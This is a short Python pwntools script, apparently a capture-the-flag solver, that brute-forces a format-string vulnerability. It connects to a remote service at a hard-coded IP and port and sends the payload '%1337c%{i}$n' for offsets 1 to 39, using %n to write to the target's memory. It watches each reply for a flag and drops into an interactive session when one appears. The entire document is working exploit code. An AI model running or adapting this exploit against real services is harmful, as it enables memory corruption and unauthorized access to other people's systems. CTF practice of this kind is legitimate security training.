from pwn import *

HOST = "152.118.201.241"
PORT = 3010

for i in range(1,40):

    p = remote(HOST, PORT)

    payload = f"%1337c%{i}$n".encode()

    log.info(f"trying offset {i}")

    p.sendlineafter(b"kids?", payload)

    out = p.recvall(timeout=2)

    if b"flag" in out.lower():
        log.success(f"offset correct: {i}")
        print(out.decode())
        p.interactive()
        break

    p.close()